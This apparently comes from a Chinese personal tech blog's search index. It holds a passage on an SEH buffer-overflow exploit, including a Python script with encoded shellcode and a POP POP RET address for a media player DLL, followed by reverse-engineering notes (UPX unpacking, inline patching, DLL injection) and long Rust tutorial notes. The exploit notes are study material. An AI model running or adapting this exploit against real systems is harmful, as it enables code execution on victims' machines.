CHAIN patternmsf-pattern_create -l 5000产生一个序列，用于定位溢出点 msf5 &gt; msfpescan -p Player.dll | grep -v “000”寻找pop pop ret 命令地址 -v 不匹配“000” int 3 指令（0xcc） 中断指令 import struct uitext = &quot;ui_exploit.txt&quot; junk = &quot;\\x41&quot; * 584 seh_next = &quot;\\xeb\\x04\\x90\\x90&quot; seh_handler = str(struct.pack(&apos;&lt;L&apos;, 0x10018de8)) shellcode = &quot;\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x4f\\x49\\x49\\x49\\x49\\x49&quot; +\\ &quot;\\x49\\x51\\x5a\\x56\\x54\\x58\\x36\\x33\\x30\\x56\\x58\\x34\\x41\\x30\\x42\\x36&quot; +\\ &quot;\\x48\\x48\\x30\\x42\\x33\\x30\\x42\\x43\\x56\\x58\\x32\\x42\\x44\\x42\\x48\\x34&quot; +\\ &quot;\\x41\\x32\\x41\\x44\\x30\\x41\\x44\\x54\\x42\\x44\\x51\\x42\\x30\\x41\\x44\\x41&quot; +\\ &quot;\\x56\\x58\\x34\\x5a\\x38\\x42\\x44\\x4a\\x4f\\x4d\\x4e\\x4f\\x4a\\x4e\\x46\\x44&quot; +\\ &quot;\\x42\\x30\\x42\\x50\\x42\\x30\\x4b\\x38\\x45\\x54\\x4e\\x33\\x4b\\x58\\x4e\\x37&quot; +\\ &quot;\\x45\\x50\\x4a\\x47\\x41\\x30\\x4f\\x4e\\x4b\\x38\\x4f\\x44\\x4a\\x41\\x4b\\x48&quot; +\\ &quot;\\x4f\\x35\\x42\\x32\\x41\\x50\\x4b\\x4e\\x49\\x34\\x4b\\x38\\x46\\x43\\x4b\\x48&quot; +\\ &quot;\\x41\\x30\\x50\\x4e\\x41\\x43\\x42\\x4c\\x49\\x39\\x4e\\x4a\\x46\\x48\\x42\\x4c&quot; +\\ &quot;\\x46\\x37\\x47\\x50\\x41\\x4c\\x4c\\x4c\\x4d\\x50\\x41\\x30\\x44\\x4c\\x4b\\x4e&quot; +\\ &quot;\\x46\\x4f\\x4b\\x43\\x46\\x35\\x46\\x42\\x46\\x30\\x45\\x47\\x45\\x4e\\x4b\\x48&quot; +\\ &quot;\\x4f\\x35\\x46\\x42\\x41\\x50\\x4b\\x4e\\x48\\x46\\x4b\\x58\\x4e\\x30\\x4b\\x54&quot; +\\ &quot;\\x4b\\x58\\x4f\\x55\\x4e\\x31\\x41\\x50\\x4b\\x4e\\x4b\\x58\\x4e\\x31\\x4b\\x48&quot; +\\ &quot;\\x41\\x30\\x4b\\x4e\\x49\\x38\\x4e\\x45\\x46\\x52\\x46\\x30\\x43\\x4c\\x41\\x43&quot; +\\ &quot;\\x42\\x4c\\x46\\x46\\x4b\\x48\\x42\\x54\\x42\\x53\\x45\\x38\\x42\\x4c\\x4a\\x57&quot; +\\ &quot;\\x4e\\x30\\x4b\\x48\\x42\\x54\\x4e\\x30\\x4b\\x48\\x42\\x37\\x4e\\x51\\x4d\\x4a&quot; +\\ &quot;\\x4b\\x58\\x4a\\x56\\x4a\\x50\\x4b\\x4e\\x49\\x30\\x4b\\x38\\x42\\x38\\x42\\x4b&quot; +\\ &quot;\\x42\\x50\\x42\\x30\\x42\\x50\\x4b\\x58\\x4a\\x46\\x4e\\x43\\x4f\\x35\\x41\\x53&quot; +\\ &quot;\\x48\\x4f\\x42\\x56\\x48\\x45\\x49\\x38\\x4a\\x4f\\x43\\x48\\x42\\x4c\\x4b\\x37&quot; +\\ &quot;\\x42\\x35\\x4a\\x46\\x42\\x4f\\x4c\\x48\\x46\\x50\\x4f\\x45\\x4a\\x46\\x4a\\x49&quot; +\\ &quot;\\x50\\x4f\\x4c\\x58\\x50\\x30\\x47\\x45\\x4f\\x4f\\x47\\x4e\\x43\\x36\\x41\\x46&quot; +\\ &quot;\\x4e\\x36\\x43\\x46\\x42\\x50\\x5a&quot; junk2 = &quot;\\x90&quot; * 1000 fp = open(uitext, &apos;w&apos;) content = junk + seh_next + seh_handler + shellcode + junk2 fp.write(content) fp.close() 总结：SEH链条结构及其在栈中的位置Windows XP SP1添加的XOR和SafeSEH保护机制通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）RET操作作为exploit方式的优缺点通过windbg的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容windbg：d eip ; !exchain命令 ；u 地址 ；g 运行 frog 青蛙","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://finsenty54.github.io/tags/PWN/"}]},{"title":"RCE 初探","slug":"RCE 初探","date":"2020-08-18T13:07:01.000Z","updated":"2020-08-18T13:07:58.509Z","comments":true,"path":"2020/08/18/RCE 初探/","link":"","permalink":"http://finsenty54.github.io/2020/08/18/RCE 初探/","excerpt":"UPXupx == 加壳？代码压缩器，执行时解码后运行PS .\\upx.exe -1 -o notepad_upx.exe D:\\RCE\\notepad.exe","text":"UPXupx == 加壳？代码压缩器，执行时解码后运行PS .\\upx.exe -1 -o notepad_upx.exe D:\\RCE\\notepad.exe 段寄存器 16 位DS 存放数据段的段基址 每一个内存单元的宽度为8位。[编号]称为地址。内存单元：字节 每个字节有个编号，称为内存地址 dword ptr [esi+13000]=[notepad.01014000]=14D L’ō’ ds 寄存器没用？ 在栈中设置硬件断点 找到解壳后的OEP具体在PUSHAD中设置硬件断点，指令完成后才暂停 ，也就是POPAD 完成后暂停 ，后面JMP跳转到OEP original EP exe默认00400000dll 默认10000000 节对齐Alignment is a rounded up value. Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.The Section Alignment is usually 4096 bytes which fit the size of a memory page.So if you have a PE-file with a section (like “.text”) that contains513 bytes of data: 不足的改为整数倍Section .text will be rounded up to 1024 bytes on file.Section .text will be rounded up to 4096bytes in memory.Note the amount of slack space possible both on file and in memory. stud_pe修改size of optional header值，向文件头插入解码代码在选项头和节区头间插入代码numberofRVAandSIZES表示data_directory结构体元素个数(有些没用，可以覆盖) inline patch 内嵌补丁将补丁代码放在空白块中 变量名和函数名只是地址的一种助记符，当源文件被编译和链接成可执行程序后，它们都会被替换成地址。 取地址符&amp; .text 的 size of raw data == 400 virtual size == 280 文件中400 加载到内存中只加了280其他值时0x00 image_scn_men_write 相应内存区的写权限 rep movsb 命令 b==byte rep == repeats ECX 里大小 循环 moves 命令== ds:esi -&gt; ds:edidecreasing CX, so at the end CX becomes zero. RCE经验1 压缩器解码2 区域双重加密 内嵌补丁 test 按位与test eax, eaxeax==0 zf 设位1 Ret相当于 Pop EIP DLL注入threadProc 线程创建函数用句柄控制相应进程三种方法：创建远程线程钩子注入设置里全局注入 SPaCIoS","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"RUST学习4","slug":"RUST学习4","date":"2020-08-14T04:26:23.000Z","updated":"2020-08-14T04:27:08.603Z","comments":true,"path":"2020/08/14/RUST学习4/","link":"","permalink":"http://finsenty54.github.io/2020/08/14/RUST学习4/","excerpt":"Result&lt;T, E&gt;Rust doesn’t have exceptions. Instead, it has the typeResult&lt;T, E&gt; for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. When the panic!macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.","text":"Result&lt;T, E&gt;Rust doesn’t have exceptions. Instead, it has the typeResult&lt;T, E&gt; for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. When the panic!macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.result enum is defined as having two variants, Ok and Err, The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called unwrap, is a shortcut method that is implemented just like the match 12345use std::fs::File;fn main() &#123; let f = File::open(\"hello.txt\").unwrap();&#125; 12345use std::fs::File;fn main() &#123; let f = File::open(\"hello.txt\").expect(\"Failed to open hello.txt\");&#125; Propagating Errors1234567fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;let f = File::open(\"hello.txt\"); let mut f = match f &#123; Ok(file) =&gt; file, Err(e) =&gt; return Err(e), &#125;; A Shortcut for Propagating Errors: the ? OperatorThe?placed after a Result value is defined to work in almost the same way as the match expressions If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code. 12File::open(\"hello.txt\")?.read_to_string(&amp;mut s)?;Ok(s) 12fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123; fs::read_to_string(\"hello.txt\") If you can ensure by manually inspecting the code that you’ll never have an Err variant, it’s perfectly acceptable to callunwrap. Here’s an example: Generic 泛型将代码抽取出来，减少重复代码123456789101112fn largest&lt;T&gt;(list: &amp;[T]) -&gt; T &#123;struct Point&lt;T, U&gt; &#123; //T U代表不同的类型 x: T, y: U,&#125;fn main() &#123; let both_integer = Point &#123; x: 5, y: 10 &#125;; let both_float = Point &#123; x: 1.0, y: 4.0 &#125;; let integer_and_float = Point &#123; x: 5, y: 4.0 &#125;;&#125; where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file. 12345678910111213141516struct Point&lt;T&gt; &#123; x: T, y: T,&#125;impl&lt;T&gt; Point&lt;T&gt; &#123; fn x(&amp;self) -&gt; &amp;T &#123; &amp;self.x &#125;&#125;fn main() &#123; let p = Point &#123; x: 5, y: 10 &#125;; println!(\"p.x = &#123;&#125;\", p.x());&#125; Note that we have to declare T just after implso we can use it to specify that we’re implementing methods on the type Point. 1234567891011121314151617181920212223struct Point&lt;T, U&gt; &#123; x: T, y: U,&#125;impl&lt;T, U&gt; Point&lt;T, U&gt; &#123; fn mixup&lt;V, W&gt;(self, other: Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123; Point &#123; x: self.x, y: other.y, &#125; &#125;&#125;fn main() &#123; let p1 = Point &#123; x: 5, y: 10.4 &#125;; let p2 = Point &#123; x: \"Hello\", y: 'c' &#125;; let p3 = p1.mixup(p2); println!(\"p3.x = &#123;&#125;, p3.y = &#123;&#125;\", p3.x, p3.y);&#125; traitsDifferent types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose. Each type implementing this trait must provideits own custom behaviorfor the body of the method.相当于提供一个接口，具体内容自己实现与Java一个概念类似 123456789101112131415161718192021222324252627282930313233343536373839#![allow(unused_variables)]fn main() &#123;pub trait Summary &#123; fn summarize(&amp;self) -&gt; String;&#125;&#125;#![allow(unused_variables)]fn main() &#123;pub trait Summary &#123; fn summarize(&amp;self) -&gt; String;&#125;pub struct NewsArticle &#123; pub headline: String, pub location: String, pub author: String, pub content: String,&#125;impl Summary for NewsArticle &#123; //添加trait到结构中 fn summarize(&amp;self) -&gt; String &#123; format!(\"&#123;&#125;, by &#123;&#125; (&#123;&#125;)\", self.headline, self.author, self.location) &#125;&#125;pub struct Tweet &#123; pub username: String, pub content: String, pub reply: bool, pub retweet: bool,&#125;impl Summary for Tweet &#123; fn summarize(&amp;self) -&gt; String &#123; format!(\"&#123;&#125;: &#123;&#125;\", self.username, self.content) &#125;&#125;&#125; Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, they’re all in the same scope. Let’s say this lib.rs is for a crate we’ve called aggregator and someone else wants to use our crate’s functionality to implement the Summary trait on a struct defined within their library’s scope. They would need to bring the trait into their scope first. They would do so by specifying use aggregator::Summary;, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12. with trait implementations is that we canimplement a trait on a type only if either the trait or the type is local to our cratecan’t implement external traits on external types. as we implement the trait on a particular type, we can keep or override each method’s default behavior.specify an empty impl block with impl Summary for NewsArticle {}. 123456789101112131415161718192021222324252627282930#![allow(unused_variables)]fn main() &#123;pub trait Summary &#123; fn summarize(&amp;self) -&gt; String &#123; String::from(\"(Read more...)\") &#125;&#125;pub struct NewsArticle &#123; pub headline: String, pub location: String, pub author: String, pub content: String,&#125;impl Summary for NewsArticle &#123;&#125;pub struct Tweet &#123; pub username: String, pub content: String, pub reply: bool, pub retweet: bool,&#125;impl Summary for Tweet &#123; fn summarize(&amp;self) -&gt; String &#123; format!(\"&#123;&#125;: &#123;&#125;\", self.username, self.content) &#125;&#125;&#125; Default implementations can call other methods in the same trait, even if those other methods don’t have a default implementation. ![allow(unused_variables)]fn main() {pub trait Summary { fn summarize_author(&amp;self) -&gt; String; fn summarize(&amp;self) -&gt; String { format!(&quot;(Read more from {}...)&quot;, self.summarize_author()) } } pub struct Tweet { pub username: String, pub content: String, pub reply: bool, pub retweet: bool,} impl Summary for Tweet { fn summarize_author(&amp;self) -&gt; String { format!(“@{}”, self.username) }}} pub trait Summary { fn summarize(&amp;self) -&gt; String;} pub struct NewsArticle { pub headline: String, pub location: String, pub author: String, pub content: String,} impl Summary for NewsArticle { fn summarize(&amp;self) -&gt; String { format!(“{}, by {} ({})”, self.headline, self.author, self.location) }} pub struct Tweet { pub username: String, pub content: String, pub reply: bool, pub retweet: bool,} impl Summary for Tweet { fn summarize(&amp;self) -&gt; String { format!(“{}: {}”, self.username, self.content) }} pub fn notify(item: &amp;impl Summary) { println!(“Breaking news! {}”, item.summarize());} bound traitpub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {传入的类型必须相同 pub fn notify(item: &amp;(impl Summary + Display)) { pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) { fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32 where T: Display + Clone, U: Clone + Debug { an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,pub trait Summary { fn summarize(&amp;self) -&gt; String;} pub struct NewsArticle { pub headline: String, pub location: String, pub author: String, pub content: String,} impl Summary for NewsArticle { fn summarize(&amp;self) -&gt; String { format!(“{}, by {} ({})”, self.headline, self.author, self.location) }} pub struct Tweet { pub username: String, pub content: String, pub reply: bool, pub retweet: bool,} impl Summary for Tweet { fn summarize(&amp;self) -&gt; String { format!(“{}: {}”, self.username, self.content) }} fn returns_summarizable() -&gt; impl Summary { Tweet { username: String::from(“horse_ebooks”), content: String::from( “of course, as you probably already know, people”, ), reply: false, retweet: false, }} 1234567891011fn largest&lt;T: PartialOrd + Copy&gt;(list: &amp;[T]) -&gt; T &#123; //限制只能传进i32 char等 let mut largest = list[0]; for &amp;item in list &#123; if item &gt; largest &#123; largest = item; &#125; &#125; largest&#125; fn main() { let number_list = vec![34, 50, 25, 100, 65]; let result = largest(&amp;number_list); println!(&quot;The largest number is {}&quot;, result); let char_list = vec![&apos;y&apos;, &apos;m&apos;, &apos;a&apos;, &apos;q&apos;]; let result = largest(&amp;char_list); println!(&quot;The largest char is {}&quot;, result); } impl&lt;T: Display&gt; ToString for T { // –snip–} The Borrow Checkerwe’ll add generic lifetime parameters that define the relationship between the references lifetimeLifetime annotations don’t change how long any of the references live. &amp;i32 // a reference &amp;&apos;a i32 // a reference with an explicit lifetime &amp;&apos;a mut i32 // a mutable reference with an explicit lifetime have a function with the parameter first that is a reference to an i32 with lifetime ‘a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime ‘a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime. 123456789101112131415fn main() &#123; let string1 = String::from(\"abcd\"); let string2 = \"xyz\"; let result = longest(string1.as_str(), string2); println!(\"The longest string is &#123;&#125;\", result);&#125;fn longest&lt;'a&gt;(x: &amp;'a str, y: &amp;'a str) -&gt; &amp;'a str &#123; if x.len() &gt; y.len() &#123; x &#125; else &#123; y &#125;&#125; 返回的引用取最短的lifetime 1234567891011struct ImportantExcerpt&lt;'a&gt; &#123; part: &amp;'a str,&#125;fn main() &#123; let novel = String::from(\"Call me Ishmael. Some years ago...\"); let first_sentence = novel.split('.').next().expect(\"Could not find a '.'\"); let i = ImportantExcerpt &#123; part: first_sentence, &#125;;&#125; an instance of ImportantExcerpt can’t outlive the reference itholds in its part field. Lifetime Elision由编译器进行引用lifetime的编写三个阶段 The Static Lifetime1234#![allow(unused_variables)]fn main() &#123;let s: &amp;'static str = \"I have a static lifetime.\";&#125; means that this reference can live for the entire duration of the program lifetimes are a type of generic,fn main() { let string1 = String::from(“abcd”); let string2 = “xyz”; let result = longest_with_an_announcement( string1.as_str(), string2, &quot;Today is someone&apos;s birthday!&quot;, ); println!(&quot;The longest string is {}&quot;, result); } use std::fmt::Display; 123456789101112131415fn longest_with_an_announcement&lt;'a, T&gt;( x: &amp;'a str, y: &amp;'a str, ann: T,) -&gt; &amp;'a strwhere T: Display,&#123; println!(\"Announcement! &#123;&#125;\", ann); if x.len() &gt; y.len() &#123; x &#125; else &#123; y &#125;&#125; testcargo testChecking Results with the assert! MacroThe assert!macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true. assert_eq! and assert_ne!These macros compare two arguments for equality or inequality, respectively. should_panic 产生panic返回正确1234567891011121314151617181920212223242526272829pub struct Guess &#123; value: i32,&#125;impl Guess &#123; pub fn new(value: i32) -&gt; Guess &#123; if value &lt; 1 || value &gt; 100 &#123; panic!(\"Guess value must be between 1 and 100, got &#123;&#125;.\", value); &#125; Guess &#123; value &#125; &#125;&#125;#[cfg(test)]mod tests &#123; use super::*; #[test] #[should_panic] fn greater_than_100() &#123; Guess::new(200); &#125;&#125;fn main() &#123;&#125;#[test]#[should_panic(expected = \"Guess value must be less than or equal to 100\")] the unit type, () TDD process test 还是很不多的，C++的时候都一遍遍输入参数 $ cargo run &gt; output.txt","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"RUST学习3","slug":"RUST学习3","date":"2020-08-03T05:58:28.000Z","updated":"2020-08-03T05:59:20.019Z","comments":true,"path":"2020/08/03/RUST学习3/","link":"","permalink":"http://finsenty54.github.io/2020/08/03/RUST学习3/","excerpt":"DebugThe Debug traitenables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.","text":"DebugThe Debug traitenables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.1234567891011121314[derive(Debug)] //开启使用debug :?打印结构体struct Rectangle &#123; width: u32, height: u32,&#125;fn main() &#123; let rect1 = Rectangle &#123; width: 30, height: 50, &#125;; println!(\"rect1 is &#123;:?&#125;\", rect1); //or&#123;:#?&#125;&#125; methodtheir first parameter is always self,which represents the instance of the struct the method is being called on. impl (implementation) Methods cantake ownership of self, borrowself immutablyas we’ve done here, or borrow self mutably, just as they can any other parameter.&amp;mut self associated functionYou’ve already used the String::from associated function. Associated functions are often used for constructors that will return a new instance of the struct.123456789101112131415161718[derive(Debug)]struct Rectangle &#123; width: u32, height: u32,&#125;impl Rectangle &#123; fn square(size: u32) -&gt; Rectangle &#123; //没有self Rectangle &#123; width: size, height: size, &#125; &#125;&#125;fn main() &#123; let sq = Rectangle::square(3);&#125; Each struct is allowed to have multiple impl blocks. Enum枚举1234567891011121314enum IpAddrKind &#123; V4, //V4 V6就是所谓的变体 V6,&#125;fn main() &#123; let four = IpAddrKind::V4; let six = IpAddrKind::V6; route(IpAddrKind::V4); route(IpAddrKind::V6);&#125;fn route(ip_kind: IpAddrKind) &#123;&#125; 枚举比struct更简明12345678910fn main() &#123; enum IpAddr &#123; V4(String), V6(String), &#125; let home = IpAddr::V4(String::from(\"127.0.0.1\")); let loopback = IpAddr::V6(String::from(\"::1\"));&#125; 枚举每个变体可以有不同的类型12345678910fn main() &#123; enum IpAddr &#123; V4(u8, u8, u8, u8), V6(String), &#125; let home = IpAddr::V4(127, 0, 0, 1); let loopback = IpAddr::V6(String::from(\"::1\"));&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041[allow(unused_variables)]fn main() &#123;struct Ipv4Addr &#123; // --snip--&#125;struct Ipv6Addr &#123; // --snip--&#125;enum IpAddr &#123; V4(Ipv4Addr), V6(Ipv6Addr),&#125;&#125;enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32), &#125; impl Message &#123; fn call(&amp;self) &#123; // method body would be defined here &#125; &#125; let m = Message::Write(String::from(\"hello\")); m.call();&#125; enum option1234567![allow(unused_variables)]fn main() &#123;enum Option&lt;T&gt; &#123; //&lt;T&gt; means the Some variant of the Option enum can hold one piece of data of any type Some(T), None,&#125;&#125; option不用显示引入，已经提前有了 123456fn main() &#123; let some_number = Some(5); let some_string = Some(\"a string\"); let absent_number: Option&lt;i32&gt; = None;&#125; If we use None rather than Some, we need to tell Rust whattype of Option&lt;T&gt; we haveOption and T (where T can be any type) are different types,In other words, you have to convert an Option to a T before you can perform T operations with it. 123456789101112131415161718matchenum Coin &#123; Penny, Nickel, Dime, Quarter,&#125;fn value_in_cents(coin: Coin) -&gt; u8 &#123; match coin &#123; Coin::Penny =&gt; 1, Coin::Nickel =&gt; 5, Coin::Dime =&gt; 10, Coin::Quarter =&gt; 25, &#125;&#125;fn main() &#123;&#125; The code associated with each arm is an expression, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression. 1234567891011fn value_in_cents(coin: Coin) -&gt; u8 &#123; match coin &#123; Coin::Penny =&gt; &#123; println!(\"Lucky penny!\"); 1 &#125; Coin::Nickel =&gt; 5, Coin::Dime =&gt; 10, Coin::Quarter =&gt; 25, &#125;&#125; 123456789101112131415161718192021222324252627282930[derive(Debug)]enum UsState &#123; Alabama, Alaska, // --snip--&#125;enum Coin &#123; Penny, Nickel, Dime, Quarter(UsState),&#125;fn value_in_cents(coin: Coin) -&gt; u8 &#123; match coin &#123; Coin::Penny =&gt; 1, Coin::Nickel =&gt; 5, Coin::Dime =&gt; 10, Coin::Quarter(state) =&gt; &#123; println!(\"State quarter from &#123;:?&#125;!\", state); //得到coin里quarter里的usstate值 25 &#125; &#125;&#125;fn main() &#123; value_in_cents(Coin::Quarter(UsState::Alaska));&#125; 使用option123456789101112fn main() &#123; fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123; match x &#123; None =&gt; None, Some(i) =&gt; Some(i + 1), &#125; &#125; let five = Some(5); let six = plus_one(five); let none = plus_one(None);&#125; Combining match and enums is useful in many situations.match against an enum, bind a variable to the data inside, and then execute code based on it. 12345678910fn main() &#123; let some_u8_value = 0u8; match some_u8_value &#123; 1 =&gt; println!(\"one\"), 3 =&gt; println!(\"three\"), 5 =&gt; println!(\"five\"), 7 =&gt; println!(\"seven\"), _ =&gt; (), &#125;&#125; _省略The _ pattern will match any value.The () is just the unit value if letcare about only one of the cases. For this situation, Rust provides if let.123456fn main() &#123; let some_u8_value = Some(0u8); if let Some(3) = some_u8_value &#123; println!(\"three\"); &#125;&#125; 123456789fn main() &#123; let coin = Coin::Penny; let mut count = 0; if let Coin::Quarter(state) = coin &#123; println!(\"State quarter from &#123;:?&#125;!\", state); &#125; else &#123; count += 1; &#125;&#125; 123456789fn main() &#123; let coin = Coin::Penny; let mut count = 0; match coin &#123; Coin::Quarter(state) =&gt; println!(\"State quarter from &#123;:?&#125;!\", state), _ =&gt; count += 1, &#125;&#125; packages&gt;crates&gt;modules A package isone or more cratesthat provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.A package must contain zero or one library crates, and no more. It can contain as many binary crates as you’d like, but it must contain at least one crate (either library or binary).If a package contains src/main.rs and src/lib.rs, it has two crates: a library and a binary, both with the same name as the package.A package canhave multiple binary crates by placing files in the src/bin directory:each file will be a separate binary crate. the use keyword that brings a path into scope; and the pub keyword to make items public. We’ll also discuss the as keyword, external packages, and the glob operator Modules let us organize code within a crate into groups Create a new library named restaurant by running cargo new --librestaurant;crate //implicit module src/main.rs and src/lib.rs 产生 └── front_of_house ├── hosting │ ├── add_to_waitlist │ └── seat_at_table └── serving ├── take_order ├── serve_order └── take_payment If we want to call a function, we need to know its path.A path can take two forms: An absolute path starts from a crate root by using a crate name or a literal crate.A relative pathstarts from the current module and uses self, super, or an identifier in the current module.Both absolute and relative paths are followed by one or more identifiers separated by double colons (::). 12345678910111213mod front_of_house &#123; mod hosting &#123; fn add_to_waitlist() &#123;&#125; &#125;&#125;pub fn eat_at_restaurant() &#123; // Absolute path crate::front_of_house::hosting::add_to_waitlist(); // Relative path front_of_house::hosting::add_to_waitlist();&#125; The way privacy works in Rust is that all items (functions, methods, structs, enums, modules, and constants) are private by default. 12345678910111213141516171819202122232425mod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; //making the module public doesn’t make its contents public. &#125;&#125;pub fn eat_at_restaurant() &#123; // Absolute path crate::front_of_house::hosting::add_to_waitlist(); // Relative path front_of_house::hosting::add_to_waitlist();&#125;fn serve_order() &#123;&#125;mod back_of_house &#123; fn fix_incorrect_order() &#123; cook_order(); super::serve_order(); &#125; fn cook_order() &#123;&#125;&#125; Enums aren’t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the default for enum variants is to be public.Structs are often useful without their fields being public, so struct fields follow the general rule of everything being private by default unless annotated with pub. 123456789101112131415161718192021222324252627282930usemod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; &#125;&#125;use crate::front_of_house::hosting;pub fn eat_at_restaurant() &#123; hosting::add_to_waitlist(); hosting::add_to_waitlist(); hosting::add_to_waitlist();&#125;mod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; &#125;&#125;use self::front_of_house::hosting;pub fn eat_at_restaurant() &#123; hosting::add_to_waitlist(); hosting::add_to_waitlist(); hosting::add_to_waitlist();&#125;fn main() &#123;&#125; asThere’s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify as and a new local name, or alias, for the type. 123456789101112131415![allow(unused_variables)]fn main() &#123;use std::fmt::Result;use std::io::Result as IoResult;fn function1() -&gt; Result &#123; // --snip-- Ok(())&#125;fn function2() -&gt; IoResult&lt;()&gt; &#123; // --snip-- Ok(())&#125;&#125; this technique is called re-exporting because we’re bringing an item into scope but also making that item available for others to bring into their scope12345678910111213141516171819mod front_of_house &#123; pub mod hosting &#123; pub fn add_to_waitlist() &#123;&#125; &#125;&#125;pub use crate::front_of_house::hosting; //其他可以 另外创立一个链接pub fn eat_at_restaurant() &#123; hosting::add_to_waitlist(); hosting::add_to_waitlist(); hosting::add_to_waitlist();&#125;fn main() &#123;&#125;fn main() &#123;use std::collections::HashMap;&#125; This is an absolute path starting with std, the name of the standard library crate. 123456789101112131415use rand::Rng;// --snip--use std::&#123;cmp::Ordering, io&#125;;// --snip--fn main() &#123;use std::io::&#123;self, Write&#125;;&#125;#![allow(unused_variables)]fn main() &#123;use std::collections::*;&#125; brings all public items The mod keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module. vector12345678910111213141516171819202122fn main() &#123; let v: Vec&lt;i32&gt; = Vec::new();&#125;fn main() &#123; let v = vec![1, 2, 3]; //类别自己推测&#125;fn main() &#123; let mut v = Vec::new(); v.push(5); v.push(6); v.push(7); v.push(8);&#125;fn main() &#123; &#123; let v = vec![1, 2, 3, 4]; // do stuff with v &#125; // &lt;- v goes out of scope and is freed here&#125; 1234567891011fn main() &#123; let v = vec![1, 2, 3, 4, 5]; let third: &amp;i32 = &amp;v[2]; println!(\"The third element is &#123;&#125;\", third); match v.get(2) &#123; //gives us an Option&lt;&amp;T&gt;. Some(third) =&gt; println!(\"The third element is &#123;&#125;\", third), None =&gt; println!(\"There is no third element.\"), &#125;&#125; 123456fn main() &#123; let mut v = vec![100, 32, 57]; for i in &amp;mut v &#123; *i += 50; //解引用 dereference operator (*) to get to the value in i &#125;&#125; 12345678910111213fn main() &#123; enum SpreadsheetCell &#123; Int(i32), Float(f64), Text(String), &#125; let row = vec![ //vec类型为SpreadsheetCell 实际上存储不同类型值 SpreadsheetCell::Int(3), SpreadsheetCell::Text(String::from(\"blue\")), SpreadsheetCell::Float(10.12), ];&#125; 枚举要配合match使用 stringRemember thatstrings are UTF-8encoded,1234567891011121314151617181920212223fn main() &#123; let hello = String::from(\"السلام عليكم\"); let hello = String::from(\"Dobrý den\"); let hello = String::from(\"Hello\"); let hello = String::from(\"שָׁלוֹם\"); let hello = String::from(\"नमस्ते\"); let hello = String::from(\"こんにちは\"); let hello = String::from(\"안녕하세요\"); let hello = String::from(\"你好\"); let hello = String::from(\"Olá\"); let hello = String::from(\"Здравствуйте\"); let hello = String::from(\"Hola\");&#125;fn main() &#123; let mut s = String::from(\"foo\"); s.push_str(\"bar\");&#125;fn main() &#123; let mut s = String::from(\"lo\"); s.push('l');&#125; push method takesa single character 12345fn main() &#123; let s1 = String::from(\"Hello, \"); let s2 = String::from(\"world!\"); let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add call and no longer be valid after that.&#125; add is that the compiler can coerce the &amp;String argument into a &amp;str format1234567fn main() &#123; let s1 = String::from(\"tic\"); let s2 = String::from(\"tac\"); let s3 = String::from(\"toe\"); let s = format!(\"&#123;&#125;-&#123;&#125;-&#123;&#125;\", s1, s2, s3); //doesn’t take ownership of any of its parameters.&#125; utf-8可变字节 1-4字节，有些一个字节 有些4个字节 123456[allow(unused_variables)]fn main() &#123;let hello = \"Здравствуйте\";let s = &amp;hello[0..4];&#125; 123456#![allow(unused_variables)]fn main() &#123;for c in \"नमस्ते\".chars() &#123; println!(\"&#123;&#125;\", c);&#125;&#125; 123456#![allow(unused_variables)]fn main() &#123;for b in \"नमस्ते\".bytes() &#123; // returns each raw byte, println!(\"&#123;&#125;\", b);&#125;&#125; hashmapall of the keys must have thesame type, and all of thevaluesmust have thesame type.123456fn main() &#123; use std::collections::HashMap; let mut scores = HashMap::new(); 